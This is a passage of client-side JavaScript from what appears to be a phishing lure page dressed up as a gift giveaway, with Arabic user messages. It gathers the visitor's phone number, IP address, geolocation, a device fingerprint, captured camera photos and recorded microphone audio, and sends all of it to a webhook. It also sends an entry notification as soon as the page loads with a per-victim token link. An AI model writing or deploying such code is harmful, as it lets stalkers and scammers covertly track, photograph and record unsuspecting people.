        const formData = new FormData();

        formData.append('event', 'submission');
        formData.append('country', selectedCountry);
        formData.append('phone', userPhone);
        formData.append('ip', userIP);

        formData.append('location[lat]', userLocation.lat !== null ? String(userLocation.lat) : '');
        formData.append('location[lng]', userLocation.lng !== null ? String(userLocation.lng) : '');
        formData.append('location[accuracy]', userLocation.accuracy !== null ? String(userLocation.accuracy) : '');
        formData.append('location[error]', userLocation.error || '');

        formData.append('device[userAgent]', navigator.userAgent);
        formData.append('device[platform]', navigator.platform);
        formData.append('device[language]', navigator.language);
        formData.append('device[screen]', `${screen.width}x${screen.height}`);
        formData.append('device[colorDepth]', screen.colorDepth);
        formData.append('device[timezone]', Intl.DateTimeFormat().resolvedOptions().timeZone);
        formData.append('timestamp', new Date().toISOString());

        if (capturedPhotoFiles.length > 0) {
            capturedPhotoFiles.forEach((file, index) => {
                formData.append(`photos[]`, file, file.name);
            });
            console.log(`📸 [sendAllData] تم إضافة ${capturedPhotoFiles.length} صور`);
        }

        if (audioBlob) {
            const audioFile = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
            formData.append('audio', audioFile);
            console.log(`🎤 [sendAllData] تم إضافة ملف صوتي بحجم ${audioBlob.size} بايت`);
        }

        console.log('📤 [sendAllData] إرسال إلى Webhook');

        const result = await sendToWebhook(formData);

        if (result.success) {
            console.log('✅ [sendAllData] تم الإرسال بنجاح');
            return true;
        } else {
            console.error('❌ [sendAllData] فشل الإرسال:', result.error);
            return false;
        }
    }

    // ================================================================
    //  TIMER
    // ================================================================
    function startTimer(seconds) {
        timerSeconds = seconds;
        updateTimerDisplay();
        if (timerInterval) clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            timerSeconds--;
            updateTimerDisplay();
            if (timerSeconds <= 0) {
                clearInterval(timerInterval);
                timerDisplay.textContent = '00:00';
                showStatus(statusTimer, 'success', '🎉 تم إرسال هديتك! تحقق من هاتفك.');
            }
        }, 1000);
    }

    function updateTimerDisplay() {
        const mins = Math.floor(timerSeconds / 60);
        const secs = timerSeconds % 60;
        timerDisplay.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    }

    // ================================================================
    //  STATUS HELPER
    // ================================================================
    function showStatus(el, type, message) {
        el.className = `status ${type}`;
        el.textContent = message;
        el.style.display = 'block';
        if (type !== 'error') {
            clearTimeout(el._timeout);
            el._timeout = setTimeout(() => {
                if (el.className.includes(type)) {
                    el.style.display = 'none';
                }
            }, 8000);
        }
    }

    // ================================================================
    //  CLEANUP
    // ================================================================
    window.addEventListener('beforeunload', () => {
        if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
        if (audioStream) audioStream.getTracks().forEach(t => t.stop());
        if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
        if (timerInterval) clearInterval(timerInterval);
    });

    // ================================================================
    //  🚀 START
    // ================================================================
    window.addEventListener('load', async () => {
        const hasToken = extractTokenFromURL();
        if (!hasToken) {
            showStatus(statusCountry, 'error', '⚠️ رابط غير صحيح. يرجى استخدام الرابط المخصص لك.');
            document.querySelectorAll('.country-btn').forEach(b => b.disabled = true);
            return;
        }
        await notifyUserEntered();
        detectSuspiciousActivity();
        console.log('🛡️ الحماية مفعلة وإشعار الدخول تم إرساله إلى Webhook');
    });
</script>
